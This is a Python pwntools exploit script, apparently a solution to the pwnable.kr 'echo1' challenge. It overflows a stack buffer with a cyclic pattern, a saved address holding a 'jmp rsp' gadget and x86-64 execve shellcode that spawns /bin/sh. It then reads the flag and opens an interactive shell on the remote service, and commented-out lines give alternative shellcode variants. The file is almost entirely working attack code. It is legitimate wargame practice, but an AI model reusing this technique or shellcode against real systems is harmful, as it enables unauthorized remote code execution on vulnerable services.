#!/usr/bin/python
# -*- coding: utf-8 -*-

from pwn import *

context(arch='amd64', os='linux')
context.log_level = 'DEBUG'

id_addr = 0x00000000006020A0

shellcode = '\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x31\xc0\x99\x31\xf6\x54\x5f\xb0\x3b\x0f\x05'
#34@shellcode = '\x48\x31\xc0\x48\x83\xc0\x3b\x48\x31\xff\x57\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xd2\x0f\x05'
#27@shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
#48@shellcode = asm(shellcraft.sh())
print len(shellcode), repr(shellcode)

#io = remote('127.0.0.1', 4444)
#io = process('./echo1')
io = remote('pwnable.kr', 9010)
io.sendlineafter(': ', asm('jmp rsp'))
io.sendlineafter('> ', '1')
io.sendlineafter('\n', cyclic(40) + p64(id_addr) + shellcode)
#io.sendline()
io.sendline('cat flag')

io.interactive()
io.close()
